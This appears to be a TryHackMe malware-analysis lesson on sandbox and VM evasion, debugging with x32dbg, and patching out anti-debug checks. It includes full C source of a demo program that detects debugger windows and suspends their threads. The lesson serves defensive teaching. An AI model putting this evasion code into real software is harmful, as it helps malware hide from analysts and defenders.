- **Defeating AV signatures:** Anti-virus signatures and other signature-based detection often depend on static
patterns found inside malware. Malware authors change those patterns to
try to evade signatures. This technique is often accompanied by general
obfuscation of malware code.
- **Obfuscation of strings:** Some malware authors obfuscate the strings in malware by decoding them at
runtime. When we search the malware for strings, we might find nothing
useful. However, when the malware runs, it decodes those strings during
execution. Malware authors might obfuscate important strings, such as
URLs, C2 domains, etc., to avoid burning the infrastructure based on a single-string search.
- **Runtime loading of DLLs:** Since we can identify malware imports while analyzing PE headers, malware
authors often use the Windows libraries' LoadLibrary or LoadLibraryEx to load a DLL at runtime. When analyzing this malware statically, we might not see
all the functions it is linked to while analyzing its headers.
- **Packing and Obfuscation:** Packing is very popular amongst malware authors. Packing malware is like
packing a present. When we look at a packed present, we can't say what
might be inside it unless we unpack the wrapper and take out the
present. Similarly, packers pack the malware in a wrapper by writing
code that decodes the malware at runtime. So when performing static
analysis, we might be unable to see what is inside the packer. However,
when we execute the malware, it unpacks the code, loads the actual
malicious code into the memory, and then executes it.

As we
 might have observed, most of these techniques are suitable for hiding 
in plain sight, but they can be defeated when the malware is executed 
while performing dynamic analysis.

## Evasion of Basic Dynamic Analysis:

Malware authors do not just accept their fate and let dynamic 
analysis detect their samples. For evasion of dynamic analysis, a host 
of techniques are employed. These techniques generally depend on 
identifying whether the malware runs in a controlled analysis 
environment. The following techniques are commonly used for this 
purpose:

- **Identification of VMs:** Though some of these
techniques might backfire nowadays since a lot of enterprise
infrastructure is hosted on VMs, one of the favourites of malware
authors has been to identify if the malware is running inside a VM. For this, malware often checks for registry keys or device drivers
associated with popular virtualization software such as VMWare and
Virtualbox. Similarly, minimal resources, such as a single CPU and
limited RAM, might indicate that the malware is running inside a VM. In this scenario, malware will take a different execution path that is not malicious to fool the analyst.
- **Timing attacks:** Malware will often try to time out automated analysis systems. For example,
when malware is executed, it will try to sleep for a day using the
Windows Sleep library. After a few minutes, the automated analysis
system will shut down, finding no traces of malicious activity. Newer
malware analysis systems can identify these attacks and try to mitigate
them by shortening the time the malware sleeps. However, malware can
identify those mitigations by performing targeted timing checks to see
if the time is being manipulated. This can be done by noting the time of execution and comparing it with the current time after the execution of the sleep call.
- **Traces of user activity:** Malware tries
to identify if there are traces of user activity in the machine. If no
or very few traces are found, malware will decide that it is being
executed inside a controlled system and take a different, benign
execution path. Traces of user activity can include no mouse or keyboard movement, lack of browser history, no recently opened files, little
system uptime, etc.
- **Identification of analysis tools:** Malware can ask the Windows OS for a running process list using Process32First, Process32Next, or
similar functions. If popular monitoring tools are identified among the
list of running processes, malware can take a benign execution path. For example, if ProcMon or ProcExp is running, malware can identify that
and switch to benign activities. Another way to identify analysis tools
is by looking at the names of different windows open in a system. If the malware finds Ollydbg or ProcMon in the open Windows, it can switch to a different execution path.

By employing these techniques, 
malware authors make it difficult for malware analysts to perform 
analysis. However, malware analysts can use some tools and techniques to
 take greater control over malware execution, helping them defeat these 
evasion techniques. In the upcoming tasks, we will learn about some of 
these techniques.

**Introduction to Debugging**

The
 term Debugging is widely used by software programmers to identify and 
fix bugs in a program. Similarly, a malware sample trying to evade 
detection or reverse engineering can also be considered a program having
 a bug. A malware reverse engineer often has to debug a program to 
remove any roadblocks that prevent it from performing its malicious 
activity. Therefore, interactive debugging becomes an essential part of 
advanced malware analysis. Debuggers provide a malware analyst with the 
control desired to monitor a running program more closely, looking at 
the changes in different registers, variables, and memory regions as 
each instruction is executed. A debugger also allows a malware analyst 
to change the variables' values to control the program's flow at 
runtime, providing greater control over the execution path the malware 
follows.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/dff36efedbacd9e2896e43cdb4e63541.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/dff36efedbacd9e2896e43cdb4e63541.png)

## Types of Debuggers:

We can loosely categorize debuggers into one of the following three categories.

### Source-Level Debuggers:

Source Level Debuggers work on the source code level. Most software 
programmers use source-level debuggers while writing code to check their
 code for bugs. A source-level debugger is a high-level debugger 
compared to the other two options. When using a source-level debugger, 
we often see the local variables and their values.

### Assembly-Level Debuggers:

When a program has been compiled, its source code is lost and can't 
be recovered. This is the case with malware analysis. We don't have the 
malware's source code we are investigating; instead, we have a compiled 
binary. An assembly-level debugger can help us debug compiled programs 
at the assembly level. While debugging with an assembly-level debugger, 
we often see the CPU registers' values and the debuggee's memory. This 
is the most common type of debugger used for malware reverse 
engineering. The debugger attaches to the program that has to be 
debugged and executes it as per the analyst's desire.

### Kernel-Level Debuggers:

Kernel-level debuggers are a step even lower than assembly-level 
debuggers. As the name suggests, these debuggers debug a program at the 
Kernel Level. For this level of debugging, generally, two systems are 
required. One system is used for debugging the code running on the other
 system. This is because if the kernel is stopped using a breakpoint, 
the whole system will stop.

**Familiarization With a Debugger**

For malware analysis, there are many options to choose a debugger from. These options include Windbg, Ollydbg, IDA, and Ghidra.
 For this room, we will be using x32dbg and x64dbg. Before proceeding, 
please start the machine by clicking the option in the top-right corner.
 The machine will open in the split view. Alternatively, you can connect
 to the machine using the following credentials:

**Username:** administrator

**Password:** Passw0rd!

The attached VM is essentially a FLARE VM,
 distributed by Mandiant (previously FireEye, now part of Google), 
widely used for reverse engineering malware. It includes all the tools 
required for our analysis in this room. To start, we can navigate to 
Desktop > Tools > debuggers > x32dbg.exe to run the debugger. 
We will be greeted with the following interface.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/122f3938f004ced754a5732cefeca9b0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/122f3938f004ced754a5732cefeca9b0.png)

To open a file in the debugger, we can navigate to File > Open and
 open our desired file. The below screenshot shows the interface with a 
sample opened in the debugger. We are currently seeing the CPU tab in the interface. Please note that we must use x32dbg for 32-bit samples and x64dbg for 64-bit samples.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b7d1b50712af9e82941388fe409e5c34.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b7d1b50712af9e82941388fe409e5c34.png)

As we can see in the bottom left corner, the execution of the program
 is paused because a System breakpoint has been reached. We can control 
whether to execute one instruction at a time or the whole program. But 
before that, let's take a look at the screenshot above. Here, we can see
 Disassembly in the middle pane, with the Instruction pointer pointing 
to the next instruction executed if we start the program. In the right 
pane, we can see the registers and their values. We can note that the 
value in EIP is the address EIP is pointing to in the disassembly pane. 
Similarly, on the bottom pane, we can see the stack view (right), the 
dump view (left), and the timer showing the time we spent debugging the 
sample (right corner).

Let's look at some of the other tabs. The breakpoints tab shows the 
current status of breakpoints. Breakpoints are points where the 
execution of the program is paused for the analyst to analyze the 
registers and memory. A breakpoint on a specific instruction can be 
enabled by clicking the dot in front of that instruction in the CPU tab.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/79e896ba320e9345a1d363e45a8f20c7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/79e896ba320e9345a1d363e45a8f20c7.png)

The Memory Map shows the memory of the program.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/62a68abf449368d2f1ca833ad397d56f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/62a68abf449368d2f1ca833ad397d56f.png)

We can also see the Call stack of the program.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/24780cf5def1f11fee9ef2cb137ee61d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/24780cf5def1f11fee9ef2cb137ee61d.png)

The threads running in the program are shown in the threads tab.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/725747fd97bff2e4fb093a8fa3144252.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/725747fd97bff2e4fb093a8fa3144252.png)

Any handles to files, processes, or other resources the process accesses are shown in the handles tab.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/629c819b78c70d1d9061153e15142682.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/629c819b78c70d1d9061153e15142682.png)

**Debugging in Practice**

Now
 that we are familiar with the UI of x32dbg, let's learn about debugging
 a program by executing it step-by-step. Let's start by opening one of 
the crackmes from the attached VM.
 We can do this by clicking File > Open. We will see the below window
 asking us to select the file we want to select. Select 
crackme-arebel.exe as the file we want to debug.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/4172b48611632cfdb735d7621b3e9a74.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/4172b48611632cfdb735d7621b3e9a74.png)

We select the file we need to open. The debugger attaches itself to 
the process and pauses it before it starts. We can see that a blank 
Command window opens in the background. This shows that the process has 
started but was stopped by the debugger. Please note that this window 
might not open with all processes. It will depend on the User Interface 
of the process. In the debugger window, we can see the familiar 
disassembly, the registers, the stack and other useful information. 
Please note that the address might not always be as shown in the images.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/40468f1c9a9284260a939e5e296b48fd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/40468f1c9a9284260a939e5e296b48fd.png)

In the debugger window, we have some features that help us control 
the execution. In the below screenshot, we can see some of them 
highlighted.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fa08515570b4fc7c68a46954178b9c82.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fa08515570b4fc7c68a46954178b9c82.png)

Among these, from left to right, we have the feature for opening a 
new file, restarting the execution of the opened file from the start, 
and stopping the execution. The arrow key will execute the program until
 it is stopped or paused by some other control (Please do not press this
 button right now as it might freeze the program. If you did, kindly 
restart the program by terminating it through the Task Manager). Then we
 have the pause option. The last two options are for stepping into and 
stepping over. The rest of the options are also useful, but for the 
scope of this room, we will only be using the ones mentioned above.

So now that we know how to control the execution, let's execute the 
program using the arrow key (Please only press it once). When we do 
that, we can see in the bottom right corner that the program's status 
changes to Running, then Paused. Along with the status, we have the 
reason for pausing the execution. It says "INT3 breakpoint "TLS Callback
 1"....". This means that we have hit a [TLS callback](https://hex-rays.com/blog/tls-callbacks/), and the debugger was programmed to break execution on TLS callbacks.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/89d37239a974b85ff285db05de3d8d51.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/89d37239a974b85ff285db05de3d8d51.png)

In the debugger, we can set where to put automatic breakpoints on a 
program by going to the Options > Preferences menu. The following 
screenshot shows the different points where breakpoints are 
automatically placed. We can see that TLS Callbacks and System TLS 
Callbacks are checked, which means execution will be broken on these 
events.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/218abdcbcc003bea8207e4c9265e666a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/218abdcbcc003bea8207e4c9265e666a.png)

Since TLS callbacks are often used as an anti-reverse engineering 
technique, we should be careful when navigating this TLS callback. 
Therefore, it will be prudent to single-step each instruction while we 
are in the callback.  We can do that by clicking the step-into option we
 discussed above. After stepping into every instruction, we see the EIP 
moving to the next instruction, and the values in the registers and 
stack change accordingly. After stepping in a few instructions, we reach
 a conditional jump instruction. In the pane below the disassembly, we 
can see that the debugger tells us that the jump is not taken. The 
registers pane shows that the ZF is set, so the jump is not taken.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/097d86e3c54dcdd93f3577bdf144695a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/097d86e3c54dcdd93f3577bdf144695a.png)

If we analyze both execution paths, we see if the jump is taken, it 
goes to address D116E, which pops EBP and returns. On the contrary, the 
current execution path, where the jump is not taken, takes us to address
 D1000. We can see what is on this address by double-clicking on the 
address. So let's go there. Alternatively, we can hover over the address
 to get a glimpse of the instructions on that address. The below 
screenshot shows the code when we follow the address. Here we see a few 
API calls like CreateToolhelp32Snapshot, LoadLibrary and GetProcAddress if
 we follow it down further. If we were sure that this function call was 
intended and we wanted to return after the function was executed, we 
could step over, which will bring us back after the function has been 
executed. However, the function seems too important to bypass straight 
away.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/d2675e587733af5f9e60d492e8a6643e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/d2675e587733af5f9e60d492e8a6643e.png)

These libraries can be used to evade detection or for legitimate 
purposes, but we don't know that for now. So we can move along this 
path, and if we see a red flag, we just restart it again using the 
restart execution option. Moving forward, we see that the Library being 
loaded is Suspend Thread.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/56b71a7c589da942a82fa719bd89086d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/56b71a7c589da942a82fa719bd89086d.png)

The SuspendThread API is being loaded. This TLS callback will suspend
 the thread based on detecting a running process, such as a debugger 
(the CreateToolhelp32Snapshot API helps identify running processes).  
This is why the program will freeze if we proceed with the execution. We
 can verify this hypothesis by moving forward along this code path. On 
verification, we find that this is an evasion code path. Therefore, we 
would like to bypass it. For that, we would like to take the jump in the
 start of the TLS callback. Let's restart the execution and get to the 
TLS callback in the next task.

**Bypassing unwanted execution path**

In
 the below screenshot, we can see that the execution has been restarted 
and brought back to the branch of code where we identified a detection 
evasion, that is, at the TLS callback breakpoint.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/136b6cf7bd7086addb9408698cc85e87.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/136b6cf7bd7086addb9408698cc85e87.png)

Stepping a few instructions to reach the conditional jump, we get to the following point.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/4970b3bbb816d606848bd2dab7c31b15.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/4970b3bbb816d606848bd2dab7c31b15.png)

We see that the jump is not being taken at this point. In the 
previous task, we identified that the ZF was the reason for the jump not
 being taken. By double-clicking ZF in the right pane, we can change the
 ZF to 0.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1f51023eeeb8a1f3e142cb90b9dd6471.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1f51023eeeb8a1f3e142cb90b9dd6471.png)

We can see here that the ZF is now 0, and the jump is taken. This 
way, we can bypass the unwanted execution path. If we step further or 
execute the program, it will take the jump and move to address D116E.

What
 we did here changed the execution path on runtime by manipulating the 
registers. However, if we execute the sample again, it will again go on 
to the evasion path unless we change the registers. If we wish to defang
 the binary, we will have to change it so that the evasion path is not 
an option if it is just run through double-clicking. This is called 
patching. This way, after being defanged, we can perform dynamic 
analysis to reach our desired conclusion. Let's see how we can do that.

We
 can right-click on the instruction we want to edit to find the options 
related to that instruction. Among these is the option to edit, as seen 
in the following screenshot.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7b89d424bca2089cf9e9c782a2a7acb7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7b89d424bca2089cf9e9c782a2a7acb7.png)

When we press edit, we see the following window.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1534838bea416e087e8dc36396e5d75f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1534838bea416e087e8dc36396e5d75f.png)

In the lowermost pane, we see 75 05 in hex, the opcode for the 
conditional jump instruction. We can change this in the following ways.

1. Change the jne to je. This way, the jump will be taken without us changing the ZF.
2. Change the conditional jump to an unconditional jump. This way, the jump will
always be taken regardless of the condition above.

Among 
these two options, the second one is better as it gives us surety for 
the jump. However, there is one more way we can edit the binary for it 
to take our preferred execution path. That is, by filling the call 
instruction at address D1169 with NOPs. As discussed in a previous room,
 NOPs are instructions that don't do anything. The screenshot below 
shows that we can fill the instruction with NOP by right-clicking and going to Binary > Fill with NOPs.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7d4efe1dfbb01540363d0452fd43fcce.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7d4efe1dfbb01540363d0452fd43fcce.png)

Once done, we can go to File > Patch File to write this file to 
disk. We might see something like the below window once we navigate to 
that.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7330c3585ccd2dd3cb0b87a59c21d86f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7330c3585ccd2dd3cb0b87a59c21d86f.png)

By clicking Patch File on this window, the debugger will ask us where
 to save the patched file. This is how it will look once we have filled 
it with NOPs. Notice that a single instruction has been replaced with 
five NOP instructions. This is because the size of the single instruction was equal to five NOP instructions. This is more visible in the above screenshot, where each NOP instruction is mapped against equal sized Opcode.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/da552159734d2a1b0fe694032f8c951e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/da552159734d2a1b0fe694032f8c951e.png)

In the attached VM, we can see that the file crackme-arebel1.exe is patched. This is how the same file looks when patched and saved.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/3f919d19066331c51ca68c264f647608.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/3f919d19066331c51ca68c264f647608.png)

Hurray, we have used the debugger to patch a file evading debuggers!

## **ANTI-REVERSE ENGINEERING**

**Introduction**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/ef5e6dc86b83c0ceac8e9c3c233a73a4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/ef5e6dc86b83c0ceac8e9c3c233a73a4.png)

Malware
 authors are constantly looking for ways to evade detection and analysis
 to maintain the effectiveness of their malware. At the same time, 
security professionals are working to develop new methods and tools for 
detecting and mitigating the threat posed by malware. This ongoing "arms
 race" can lead to the development of increasingly sophisticated and 
effective malware defences as both sides seek to stay ahead of their 
counterparts.

Reverse engineering is the process of 
studying a technology product, software, or hardware to learn how it 
works and extract its functionality or design information. In
 cybersecurity, reverse engineering is used to understand how malware 
works, extract indicators of compromise (IOCs), and develop adequate 
detections, protections, and countermeasures.

As
 a response, malware authors are motivated to protect their malware from
 analysts. They use anti-reverse engineering techniques to make malware 
more challenging to analyze, so it can continue propagating and 
infecting more systems before security measures are implemented.

This
 constant back and forth between malware analysts and authors can be 
aptly described as an "arms race". Malware authors develop new and 
sophisticated techniques to avoid detection and analysis, and security 
professionals respond by developing new methods and tools to detect and 
mitigate the threat posed by malware. As each side grows new techniques,
 the other responds with even more advanced ones, creating a cycle of 
escalation.

**Anti-Debugging (Overview)**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/a7df376a927f5fa720f1b37a096184b3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/a7df376a927f5fa720f1b37a096184b3.png)

Debugging
 is the process of examining software to understand its inner workings 
and identify potential vulnerabilities or issues. Debugging involves 
software tools called debuggers that allow analysts to step through the 
code and monitor its execution.

Here are the commonly used debuggers for malware analysis nowadays:

- x64dbg
- Ollydbg
- Ida Pro
- Ghidra

# Anti-Debugging techniques

Malware
 authors use anti-debugging measures to make it difficult for analysts 
to use debugging tools to analyze the malware's behaviour.

Some of the most common anti-debugging measures include, but are not limited to:

| Checking for the presence of debuggers | Malware
 code looks for processes or files associated with debugging tools or 
hardware-based techniques, such as detecting hardware breakpoints. For 
example, a common anti-debugging technique uses the Windows API function `IsDebuggerPresent` to check if a debugger is running. You can see this in action in the [Advanced Dynamic Analysis room](https://tryhackme.com/room/advanceddynamicanalysis). |
| --- | --- |
| Tampering with debug registers | Malware
 may try to modify or corrupt debug logs, which debuggers use to control
 the execution of code. This prevents the debugger from functioning 
correctly. |
| Using self-modifying code | This
 is a sophisticated technique where malware modifies itself while 
running, making it difficult for a debugger to follow the code flow. |

**Anti-Debugging using Suspend Thread**

[Suspend Thread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread) is a Windows API
 function that is used to pause the execution of a thread in a running 
process. This function has legitimate uses but can also be called from 
within a malware process to suspend any threads attempting to debug or 
analyze it. What better way to thwart debugging than not making the 
debugger work at all?

We have created a simple program that does the above technique. You can try and run it to see how it behaves.

1. Run the x32dbg tool from the Desktop. Open the `suspend-thread.exe` file from the `C:\Malware\` directory.
2. Press `F9` twice to continue the execution of the malware.
3. Notice that x64dbg will now become unresponsive. You can confirm the suspended process by opening Task Manager.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/6e78f4aab8de049609c41c5588f70124.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/6e78f4aab8de049609c41c5588f70124.png)

*(To completely terminate x64dbg, right click on it and select "End Task").*

The code snippet below shows how the malware works under the hood:

See code snippet

`#include <windows.h>#include <string.h>#include <wchar.h>#include <tlhelp32.h>#include <stdio.h>

DWORD g_dwDebuggerProcessId = -1;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM dwProcessId)
{
    DWORD dwWindowProcessId;
    GetWindowThreadProcessId(hwnd, &dwWindowProcessId);

    if (dwProcessId == dwWindowProcessId)
    {
		int windowTitleSize = GetWindowTextLengthW(hwnd);
		if ( windowTitleSize <= 0 )
		{
			return TRUE;
		}
		wchar_t* windowTitle = (wchar_t*)malloc((windowTitleSize + 1) * sizeof(wchar_t));
		
        GetWindowTextW(hwnd, windowTitle, windowTitleSize + 1);

		if (wcsstr(windowTitle, L"dbg") != 0 ||
			wcsstr(windowTitle, L"debugger") != 0 )
		{
            g_dwDebuggerProcessId = dwProcessId;
			return FALSE;
		}
 
       return FALSE;
    }

    return TRUE;
}

DWORD IsDebuggerProcess(DWORD dwProcessId)
{
    EnumWindows(EnumWindowsProc, (LPARAM)dwProcessId);
    return g_dwDebuggerProcessId == dwProcessId;
}

DWORD SuspendDebuggerThread()
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
	{
        printf("Failed to create snapshot\n");
        return 1;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hSnapshot, &te32))
	{
        printf("Failed to get first thread\n");
        CloseHandle(hSnapshot);
        return 1;
    }

    do
	{
        HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
        if (hThread != NULL)
		{
            DWORD dwProcessId = GetProcessIdOfThread(hThread);
			if ( IsDebuggerProcess(dwProcessId) )
			{
				printf("Debugger found with pid %i! Suspending!\n", dwProcessId);
				DWORD result = SuspendThread(hThread);
 				if ( result == -1 )
				{
					printf("Last error: %i\n", GetLastError());
				}
			}
            CloseHandle(hThread);
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);

    return 0;
}

int main(void)
{
	SuspendDebuggerThread();

	printf("Continuing malicious operation...");
	getchar();
}`

If you don't want to be bothered with reading the source code, here is a short explanation of the steps used by this technique:

1. The malware goes through all threads in the Windows system.
2. For each thread, it calls `EnumWindow` to go through each window displayed on the screen.
3. If the name of the window has the strings `debugger`, `dbg`, or `debug`, then the malware knows that a debugger is running.
4. If a debugger is present, the malware calls, which suspends the threads of the debugger, making it crash.
5. The malware proceeds with its malicious purpose.

As
 you can see, this method can effectively stop an analyst from 
continuing with the investigation. Fortunately, we have a way of dealing
 with this.

# Patching

Patching
 is one of the most critical skills required of an analyst. The Advanced
 Dynamic Analysis room has already covered this skill, but we'll have a 
quick review here.

In this exercise, we want to patch the function SuspendThread so that our debugger won't get suspended.

- Open x32dbg by double-clicking on its icon from the Desktop.
- Press the `F3` key to show the "Open" dialogue window. Look for our sample file called `suspend-thread.exe` in the `C:\Malware\` directory.
- Press the `F9` key once to jump execution to the EntryPoint, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/71685df3111c0b1789fd7efe893c71c6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/71685df3111c0b1789fd7efe893c71c6.png)

- Right-click anywhere on the main screen, highlight "Search for > Current Module", then select "Intermodular calls".
- On the search field at the bottom, type "SuspendThread". This will filter
the list in the main window showing us one entry. Double-click on this
entry.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/b8346843b287e15dc4403778a3a0a9b0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/b8346843b287e15dc4403778a3a0a9b0.png)

- You are now on the part of the code that calls the SuspendThread API. To
skip this function, right-click on the Suspendthread line and select
Binary > Fill with NOPs. Don't change anything here, and press "OK".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/cbebefac61a8e9768eb6bd112efb5822.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/cbebefac61a8e9768eb6bd112efb5822.png)

- You will see that memory locations `0004011AB` up to `004011B0` are now all set to the `90` hex value or `nop` (No Operation). If execution reaches this instruction, it will do nothing and proceed with the following line.
- Press `F9` to continue execution, and we'll see that debugging continues at the
very end without crashing our debugger. Note that while the console
prints out lines that say "Debugger found with PID XXXX! Suspending!",
it's not doing anything because we've skipped the function that does the suspending.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/2adb65eb552a957b2d52c88edd672cf3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/2adb65eb552a957b2d52c88edd672cf3.png)

Now,
 this is great. However,  if you try debugging again, you'll discover it
 will start crashing again. This is because our patches are reset and 
are now gone. To avoid re-applying patches in the future, we can export 
and import our patches for future use.

**Exporting and Importing Patches**

Stop debugging by pressing `Alt+F2` and go through the patching steps in the previous section again, but do not do the last step.

- Once the patches you want are in place, on the top bar, go to "View > Patch file..." to open the "Patch" dialogue window.
- A list of our patches will appear on the right panel. You can see there
are six entries. This refers to the six memory locations that we have
set to NOPs.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/b7d66b0ffae51d6ba9992e587067cead.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/b7d66b0ffae51d6ba9992e587067cead.png)

- Click on the "Export" button. On the next dialogue window, click "Yes" to continue. Save this file to a location of your choice.
- Stop the debugger by pressing `Alt+F2`.

Debug
 the file again. Because debugging has restarted, our previous patches 
have now been erased. We can restore it by importing the file we made a 
while ago.

- Go to the patches dialogue window again to "View > Patch file...".
- But this time, press the "Import" button and select the file we saved.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/5b3a92ac38ce313efd141f1fddb35572.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/5b3a92ac38ce313efd141f1fddb35572.png)

- Once imported, close the window and press `F9` again to continue execution. You'll notice that the previous patches are now re-applied.

Exporting
 and importing patches are very helpful in reverse engineering programs 
as it allows you to save your work to save the hassle of doing them all 
over again.

**VM Detection (Overview)**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/674d949572c1ed79812310fc208eb7f1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/674d949572c1ed79812310fc208eb7f1.png)

Virtual
 Machines (VMs) are software platforms that simulate a computer 
environment inside another computer system. These are useful in reverse 
engineering because they provide a cost-effective, controlled, and 
isolated environment for monitoring and analyzing suspicious software or
 malware. VMs also allow for the creation of snapshots and checkpoints 
that can be used to restore the system to a previous state, which helps 
test different scenarios and maintain a history of the analysis process.

When malware identifies that it is running on a VM, it may decide to respond differently; for example, it may change its behaviour by:

- Executing only a minimal subset of its functionality
- Self-destructing by deleting itself or overwriting parts of its code
- Cause damage to the system by deleting or encrypting files; or
- Not run at all

All of the above behaviours aim to reveal less information, making it harder for the analyst to progress.

**Detection Techniques**

Malware
 can employ various techniques to detect and evade analysis in virtual 
machine environments. Some of them are listed below:

| Checking running processes | VMs have easily identifiable processes; for example, VMWare runs a process called `vmtools`, while VirtualBox has `vboxservice`. Malware can use the [EnumProcess](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses) Windows API to list all the processes running on the machine and look for the presence of these tools. |
| --- | --- |
